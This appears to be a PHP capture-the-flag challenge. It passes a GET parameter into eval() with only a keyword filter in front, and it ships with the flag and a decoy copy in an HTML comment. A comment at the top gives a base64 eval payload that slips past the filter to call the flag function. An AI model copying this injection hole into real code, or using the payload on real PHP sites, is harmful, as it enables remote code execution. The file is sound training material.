<?php
	//payload str=${${eval(base64_decode($_GET[0]))}}&0=c2hvd19mbGFnKCk7
	error_reporting(0);
	function show_flag(){
		$flag = "flag{evil_eval_devil}";
		echo $flag;
		exit();
	}
	function anti(){ 
		$query = $_SERVER['QUERY_STRING'];
		$query = urldecode($query);
		$query = strtolower($query);
		if(preg_match('/show/', $query) or preg_match('/flag/', $query)){
	 		return false;
	 	}else{
	 		return true;
	 	}
	}
	if(anti()){
		eval('"$str=(string)'.$_GET['str'].'";');
	}else{
		echo 'detect the evil words';
	}
?>
<!-- 
error_reporting(0);
function show_flag(){
	$flag = "a f4ke flag";
	echo $flag;
	exit();
}
function anti(){ 
	$query = $_SERVER['QUERY_STRING'];
	$query = urldecode($query);
	$query = strtolower($query);
	if(preg_match('/show/', $query) or preg_match('/flag/', $query)){
 		return false;
 	}else{
 		return true;
 	}
}
if(anti()){
	eval('"$str=(string)'.$_GET['str'].'";');
}else{
	echo 'detect the evil words';
}
 -->